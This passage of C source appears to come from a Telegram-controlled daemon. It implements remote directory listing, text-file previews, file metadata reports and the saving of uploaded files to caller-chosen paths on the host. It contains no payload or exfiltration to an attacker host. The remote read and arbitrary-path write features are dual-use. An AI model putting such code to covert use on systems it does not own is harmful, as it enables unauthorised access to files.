          char sz_suffix[64];
          snprintf(sz_suffix, sizeof(sz_suffix), "</code> <i>(%s)</i>\n",
                   size_str);
          size_t s_len = strlen(sz_suffix);
          if (offset + s_len < capacity - 256) {
            memcpy(output + offset, sz_suffix, s_len);
            offset += s_len;
            displayed_count++;
          }
        }
      }
    } else {
      truncated = 1;
    }
  } while (FindNextFileW(find_handle, &find_data));

  FindClose(find_handle);

  if (dir_count == 0 && file_count == 0) {
    static const char empty_msg[] = "<i>(Directory is empty)</i>\n";
    if (offset + sizeof(empty_msg) - 1 < capacity - 128) {
      memcpy(output + offset, empty_msg, sizeof(empty_msg) - 1);
      offset += sizeof(empty_msg) - 1;
    }
  } else if (truncated) {
    char more_buf[128];
    snprintf(more_buf, sizeof(more_buf), "<i>... and %llu more items</i>\n",
             (unsigned long long)((dir_count + file_count) - displayed_count));
    size_t m_len = strlen(more_buf);
    if (offset + m_len < capacity - 128) {
      memcpy(output + offset, more_buf, m_len);
      offset += m_len;
    }
  }

  char total_sz_str[32];
  format_size_human(total_bytes, total_sz_str, sizeof(total_sz_str));
  char footer[128];
  snprintf(footer, sizeof(footer),
           "\n📊 <b>Total:</b> %llu dirs, %llu files (%s)",
           (unsigned long long)dir_count, (unsigned long long)file_count,
           total_sz_str);
  size_t f_len = strlen(footer);
  if (offset + f_len < capacity) {
    memcpy(output + offset, footer, f_len);
    offset += f_len;
  }
  output[offset] = '\0';
  return 1;
}
#endif

int c2t_file_list_directory(const char *path_str, char *output,
                            size_t capacity) {
  if (!output || capacity < 64)
    return 0;
  output[0] = '\0';

  const char *target = (path_str && *path_str) ? path_str : ".";
  char *clean_path = sanitize_input_path(target);
  if (!clean_path) {
    clean_path = strdup(target);
    if (!clean_path)
      return 0;
  }

  int res = 0;
#ifdef _WIN32
  res = list_dir_windows(clean_path, output, capacity);
#else
  res = list_dir_posix(clean_path, output, capacity);
#endif
  free(clean_path);
  return res;
}

int c2t_file_read_text_preview(const char *path_str, char *output,
                               size_t capacity, size_t max_bytes) {
  if (!output || capacity < 64)
    return 0;
  output[0] = '\0';

  if (!path_str || !*path_str) {
    snprintf(output, capacity,
             "⚠️ <b>No path specified.</b>\n<i>Usage:</i> <code>/cat "
             "&lt;file_path&gt;</code>");
    return 0;
  }

  char *clean_path = sanitize_input_path(path_str);
  if (!clean_path) {
    snprintf(output, capacity, "⚠️ <b>Invalid file path</b>");
    return 0;
  }

  c2t_stat_t st;
  FILE *f = nullptr;
#ifdef _WIN32
  wchar_t *wide = utf8_path(clean_path);
  if (!wide) {
    free(clean_path);
    snprintf(output, capacity, "⚠️ <b>Invalid UTF-8 file path</b>");
    return 0;
  }
  int stat_res = _wstat64(wide, &st);
  int saved_errno = errno;
  if (stat_res == 0)
    f = _wfopen(wide, L"rb");
  free(wide);
#else
  int stat_res = stat(clean_path, &st);
  int saved_errno = errno;
  if (stat_res == 0)
    f = fopen(clean_path, "rb");
#endif

  if (stat_res != 0 || !f) {
    if (f)
      fclose(f);
    snprintf(output, capacity,
             "⚠️ <b>Cannot access file:</b> <code>%s</code>\n<b>Error:</b> %s",
             clean_path, strerror(saved_errno));
    free(clean_path);
    return 0;
  }

#ifdef _WIN32
  if ((st.st_mode & _S_IFMT) != _S_IFREG) {
#else
  if (!S_ISREG(st.st_mode)) {
#endif
    fclose(f);
    snprintf(output, capacity,
             "⚠️ <code>%s</code> <b>is not a regular file.</b>", clean_path);
    free(clean_path);
    return 0;
  }

  size_t limit = max_bytes > 0 && max_bytes < 3200 ? max_bytes : 3000;
  unsigned char buf[3500];
  size_t bytes_read = fread(buf, 1, limit, f);
  fclose(f);

  /* Check for binary content */
  for (size_t i = 0; i < bytes_read; ++i) {
    if (buf[i] == 0) {
      snprintf(output, capacity,
               "⚠️ <b>Binary File:</b> <code>%s</code> (size: %llu bytes)\n"
               "<i>File contains binary data and cannot be displayed as text.\n"
               "Use <code>/getfile %s</code> to download it.</i>",
               clean_path, (unsigned long long)st.st_size, clean_path);
      free(clean_path);
      return 1;
    }
  }

  size_t offset = 0;
  static const char pfx[] = "📄 <b>File:</b> <code>";
  memcpy(output, pfx, sizeof(pfx) - 1);
  offset = sizeof(pfx) - 1;
  append_escaped_html(output, &offset, capacity, clean_path);

  char size_note[64];
  snprintf(size_note, sizeof(size_note),
           "</code> (<i>%llu bytes</i>)\n<pre><code>",
           (unsigned long long)st.st_size);
  size_t sn_len = strlen(size_note);
  if (offset + sn_len < capacity) {
    memcpy(output + offset, size_note, sn_len);
    offset += sn_len;
  }

  /* Append content escaped */
  char temp_str[3500];
  if (bytes_read >= sizeof(temp_str))
    bytes_read = sizeof(temp_str) - 1;
  memcpy(temp_str, buf, bytes_read);
  temp_str[bytes_read] = '\0';
  append_escaped_html(output, &offset, capacity - 128, temp_str);

  static const char sfx[] = "</code></pre>";
  if (offset + sizeof(sfx) - 1 < capacity) {
    memcpy(output + offset, sfx, sizeof(sfx) - 1);
    offset += sizeof(sfx) - 1;
  }

  if ((uint64_t)bytes_read < (uint64_t)st.st_size) {
    static const char trunc_msg[] =
        "\n<i>[Truncated. Use /getfile to download the complete file]</i>";
    if (offset + sizeof(trunc_msg) - 1 < capacity) {
      memcpy(output + offset, trunc_msg, sizeof(trunc_msg) - 1);
      offset += sizeof(trunc_msg) - 1;
    }
  }

  output[offset] = '\0';
  free(clean_path);
  return 1;
}

int c2t_file_get_info(const char *path_str, char *output, size_t capacity) {
  if (!output || capacity < 64)
    return 0;
  output[0] = '\0';

  if (!path_str || !*path_str) {
    snprintf(output, capacity,
             "⚠️ <b>No path specified.</b>\n<i>Usage:</i> <code>/fileinfo "
             "&lt;path&gt;</code>");
    return 0;
  }

  char *clean_path = sanitize_input_path(path_str);
  if (!clean_path) {
    snprintf(output, capacity, "⚠️ <b>Invalid path</b>");
    return 0;
  }

  c2t_stat_t st;
#ifdef _WIN32
  wchar_t *wide = utf8_path(clean_path);
  if (!wide) {
    free(clean_path);
    snprintf(output, capacity, "⚠️ <b>Invalid UTF-8 path</b>");
    return 0;
  }
  int stat_res = _wstat64(wide, &st);
  int saved_errno = errno;
  free(wide);
#else
  int stat_res = stat(clean_path, &st);
  int saved_errno = errno;
#endif

  if (stat_res != 0) {
    snprintf(output, capacity,
             "⚠️ <b>Cannot access:</b> <code>%s</code>\n<b>Error:</b> %s",
             clean_path, strerror(saved_errno));
    free(clean_path);
    return 0;
  }

  const char *type_str = "Other / Unknown";
  const char *type_icon = "❓";
#ifdef _WIN32
  if ((st.st_mode & _S_IFMT) == _S_IFDIR) {
    type_str = "Directory";
    type_icon = "📁";
  } else if ((st.st_mode & _S_IFMT) == _S_IFREG) {
    type_str = "Regular File";
    type_icon = "📄";
  }
#else
  if (S_ISDIR(st.st_mode)) {
    type_str = "Directory";
    type_icon = "📁";
  } else if (S_ISREG(st.st_mode)) {
    type_str = "Regular File";
    type_icon = "📄";
  } else if (S_ISLNK(st.st_mode)) {
    type_str = "Symbolic Link";
    type_icon = "🔗";
  } else if (S_ISCHR(st.st_mode)) {
    type_str = "Character Device";
    type_icon = "🔌";
  } else if (S_ISBLK(st.st_mode)) {
    type_str = "Block Device";
    type_icon = "💾";
  } else if (S_ISFIFO(st.st_mode)) {
    type_str = "FIFO / Named Pipe";
    type_icon = "🚰";
  } else if (S_ISSOCK(st.st_mode)) {
    type_str = "Socket";
    type_icon = "🌐";
  }
#endif

  char size_str[32];
  format_size_human((uint64_t)st.st_size, size_str, sizeof(size_str));

  const char *filename = filename_from_path(clean_path);
  const char *mime = mime_from_filename(filename);

  char time_str[64] = "Unknown";
  struct tm tm_buf;
#ifdef _WIN32
  if (gmtime_s(&tm_buf, &st.st_mtime) == 0) {
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S UTC", &tm_buf);
  }
#else
  if (gmtime_r(&st.st_mtime, &tm_buf) != nullptr) {
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S UTC", &tm_buf);
  }
#endif

  char perm_str[32] = {};
#ifdef _WIN32
  snprintf(perm_str, sizeof(perm_str), "%s",
           (st.st_mode & _S_IWRITE) ? "Read/Write" : "Read-Only");
#else
  snprintf(
      perm_str, sizeof(perm_str), "%c%c%c%c%c%c%c%c%c%c (%04o)",
      S_ISDIR(st.st_mode) ? 'd' : (S_ISLNK(st.st_mode) ? 'l' : '-'),
      (st.st_mode & S_IRUSR) ? 'r' : '-', (st.st_mode & S_IWUSR) ? 'w' : '-',
      (st.st_mode & S_IXUSR) ? 'x' : '-', (st.st_mode & S_IRGRP) ? 'r' : '-',
      (st.st_mode & S_IWGRP) ? 'w' : '-', (st.st_mode & S_IXGRP) ? 'x' : '-',
      (st.st_mode & S_IROTH) ? 'r' : '-', (st.st_mode & S_IWOTH) ? 'w' : '-',
      (st.st_mode & S_IXOTH) ? 'x' : '-', (unsigned int)(st.st_mode & 07777));
#endif

  snprintf(output, capacity,
           "ℹ️ <b>Filesystem Item Info</b>\n\n"
           "• <b>Path:</b> <code>%s</code>\n"
           "• <b>Name:</b> <code>%s</code>\n"
           "• <b>Type:</b> %s %s\n"
           "• <b>Size:</b> %s (<i>%llu bytes</i>)\n"
           "• <b>MIME Type:</b> <code>%s</code>\n"
           "• <b>Permissions:</b> <code>%s</code>\n"
           "• <b>Modified:</b> <code>%s</code>",
           clean_path, filename, type_icon, type_str, size_str,
           (unsigned long long)st.st_size, mime, perm_str, time_str);

  free(clean_path);
  return 1;
}

static int is_directory_path(const char *path) {
  if (!path || !*path)
    return 0;
  size_t len = strlen(path);
  if (path[len - 1] == '/' || path[len - 1] == '\\')
    return 1;

  c2t_stat_t st;
#ifdef _WIN32
  wchar_t *wpath = utf8_path(path);
  if (!wpath)
    return 0;
  int res = _wstat64(wpath, &st);
  free(wpath);
  if (res == 0 && (st.st_mode & _S_IFDIR))
    return 1;
#else
  if (stat(path, &st) == 0 && S_ISDIR(st.st_mode))
    return 1;
#endif
  return 0;
}

static void ensure_parent_dirs_exist(const char *filepath) {
  if (!filepath)
    return;
  char path_buf[1024];
  snprintf(path_buf, sizeof(path_buf), "%s", filepath);
  char *p = path_buf;

#ifdef _WIN32
  if (isalpha((unsigned char)p[0]) && p[1] == ':') {
    p += 2;
  }
#endif

  while (*p) {
    if (*p == '/' || *p == '\\') {
      char old = *p;
      *p = '\0';
      if (strlen(path_buf) > 0) {
#ifdef _WIN32
        wchar_t *wpath = utf8_path(path_buf);
        if (wpath) {
          CreateDirectoryW(wpath, NULL);
          free(wpath);
        }
#else
        (void)mkdir(path_buf, 0755);
#endif
      }
      *p = old;
    }
    p++;
  }
}

static void extract_clean_basename(const char *raw_name, char *out,
                                   size_t capacity) {
  if (!out || capacity == 0)
    return;
  out[0] = '\0';
  if (!raw_name || !*raw_name) {
    snprintf(out, capacity, "upload_%lld.bin", (long long)time(nullptr));
    return;
  }
  const char *base = filename_from_path(raw_name);
  while (isspace((unsigned char)*base))
    base++;
  if (!*base) {
    snprintf(out, capacity, "upload_%lld.bin", (long long)time(nullptr));
    return;
  }
  size_t len = 0;
  while (base[len] && len + 1 < capacity) {
    char c = base[len];
    if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '"' ||
        c == '<' || c == '>' || c == '|') {
      out[len] = '_';
    } else {
      out[len] = c;
    }
    len++;
  }
  out[len] = '\0';
}

int c2t_file_save_uploaded(const char *file_id, const char *file_name,
                           const char *caption) {
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_enabled || !config->telegram_bot_token ||
      !config->telegram_chat_id) {
    c2t_log_warning("files",
                    "Cannot save uploaded file: Telegram unconfigured");
    return 0;
  }
  if (!config->telegram_send_files) {
    c2t_log_warning("files",
                    "File upload ignored: file transfer is disabled in config");
    telegram_send_html("⚠️ <b>File Upload Rejected</b>\n<i>File transfers are "
                       "disabled on this daemon (--no-files).</i>");
    return 0;
  }
  if (!file_id || !*file_id) {
    c2t_log_error("files", "Cannot save upload: file_id is empty");
    return 0;
  }

  char clean_name[256] = {};
  extract_clean_basename(file_name, clean_name, sizeof(clean_name));

  char target_path[1024] = {};
  const char *cap = caption ? caption : "";
  while (isspace((unsigned char)*cap))
    cap++;

  /* Check if caption has leading command prefix e.g. /upload or /put */
  if (strncmp(cap, "/upload", 7) == 0 && (cap[7] == ' ' || cap[7] == '\0')) {
    cap += 7;
  } else if (strncmp(cap, "/put", 4) == 0 &&
             (cap[4] == ' ' || cap[4] == '\0')) {
    cap += 4;
  } else if (strncmp(cap, "/save", 5) == 0 &&
             (cap[5] == ' ' || cap[5] == '\0')) {
    cap += 5;
  } else if (strncmp(cap, "/file", 5) == 0 &&
             (cap[5] == ' ' || cap[5] == '\0')) {
    cap += 5;
  } else if (strncmp(cap, "/sendfile", 9) == 0 &&
             (cap[9] == ' ' || cap[9] == '\0')) {
    cap += 9;
  }
  while (isspace((unsigned char)*cap))
    cap++;

  char *clean_cap = sanitize_input_path(cap);
  if (clean_cap && *clean_cap) {
    if (is_directory_path(clean_cap)) {
      size_t dlen = strlen(clean_cap);
      char sep = (clean_cap[dlen - 1] == '/' || clean_cap[dlen - 1] == '\\')
                     ? '\0'
                     : '/';
      if (sep) {
        snprintf(target_path, sizeof(target_path), "%s/%s", clean_cap,
                 clean_name);
      } else {
        snprintf(target_path, sizeof(target_path), "%s%s", clean_cap,
                 clean_name);
      }
    } else {
      snprintf(target_path, sizeof(target_path), "%s", clean_cap);
    }
    free(clean_cap);
  } else {
    if (clean_cap)
      free(clean_cap);
    snprintf(target_path, sizeof(target_path), "./%s", clean_name);
  }

  ensure_parent_dirs_exist(target_path);

  c2t_log_info("files",
               "Downloading uploaded file '%s' (file_id: %s) to target '%s'...",
               clean_name, file_id, target_path);

  size_t downloaded_bytes = 0;
  int res = telegram_download_file(config->telegram_bot_token, file_id,
                                   target_path, config->telegram_max_file_bytes,
                                   &downloaded_bytes);

  if (!res) {
    c2t_log_error("files",
                  "Failed to download and save uploaded file '%s' to '%s'",
                  clean_name, target_path);
    char err_msg[1024];
    snprintf(err_msg, sizeof(err_msg),
             "❌ <b>File Upload Failed</b>\n\n"
             "• <b>File:</b> <code>%s</code>\n"
             "• <b>Target Path:</b> <code>%s</code>\n"
             "• <b>Reason:</b> <i>Download or disk write failed (check "
             "permissions and max file size limit of %.1f MB).</i>",
             clean_name, target_path,
             (double)config->telegram_max_file_bytes / (1024.0 * 1024.0));
    telegram_send_html(err_msg);
    return 0;
  }

  char size_str[64] = {};
  format_size_human((uint64_t)downloaded_bytes, size_str, sizeof(size_str));

  c2t_log_info("files", "File '%s' successfully saved to '%s' (%llu bytes)",
               clean_name, target_path, (unsigned long long)downloaded_bytes);

  char success_msg[1200];
  snprintf(success_msg, sizeof(success_msg),
           "📥 <b>File Uploaded Successfully</b>\n\n"
           "• <b>Original File:</b> <code>%s</code>\n"
           "• <b>Saved to:</b> <code>%s</code>\n"
           "• <b>Size:</b> %s (<i>%llu bytes</i>)\n"
           "• <b>Status:</b> 🟢 Written to disk",
           clean_name, target_path, size_str,
           (unsigned long long)downloaded_bytes);
  telegram_send_html(success_msg);

  return 1;
}

uint64_t c2t_files_get_total_bytes(void) {
  files_lock();
  uint64_t val = total_files_sent_bytes;
  files_unlock();
  return val;
}

uint64_t c2t_files_get_total_files(void) {
  files_lock();
  uint64_t val = total_files_sent_count;
  files_unlock();
  return val;
}
